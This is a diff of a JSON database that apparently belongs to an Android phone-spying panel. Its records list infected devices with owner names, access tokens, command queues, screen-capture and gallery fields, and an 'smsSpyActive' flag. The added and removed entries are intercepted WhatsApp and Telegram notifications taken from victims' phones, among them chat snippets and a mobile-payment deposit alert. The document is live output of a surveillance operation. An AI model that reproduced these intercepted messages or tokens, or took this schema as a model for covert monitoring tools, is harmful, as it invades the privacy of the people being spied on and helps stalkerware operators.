@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776778433746,
+    "lastSeen": 1776778436743,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎JB || RULZ STORE KALBAR (670 pesan): ~ -zarrstr",
+        "content": "bind",
+        "time": "21/04 20:33",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776778433985
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10320,14 +10328,6 @@
         "time": "21/04 19:54",
         "pkg": "com.whatsapp",
         "receivedAt": 1776776046590
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (86 pesan): ~ adel",
-        "content": "📷 GGL OP???300+",
-        "time": "21/04 19:54",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776776046451
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776778431222,
+    "lastSeen": 1776778434082,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16855 pesan baru dari 118 obrolan",
+        "time": "21/04 20:33",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778438886
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram: Pengguna",
@@ -14394,14 +14402,6 @@
         "time": "21/04 20:19",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776777550012
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Fastcal haikk",
-        "content": "💳 NEW DEPOSIT RECEIVED!\n━━━━━━━━━━━━━━━\n👤 Sender: NOBU / AZ*********\n🏦 Method: DANA\n💰 Amount: Rp 2.500\n💸 Fee: Rp 211\n💵 Total Payload: Rp 2.711\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO20260421211135241814\n🏷️ System ID: FSCL76336051\n⏰ 21 Apr 2026 • 20:15 WIB\n\n#DEPOSIT #DANA",
-        "time": "21/04 20:19",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777549976
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776778431105,
+    "lastSeen": 1776778437308,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
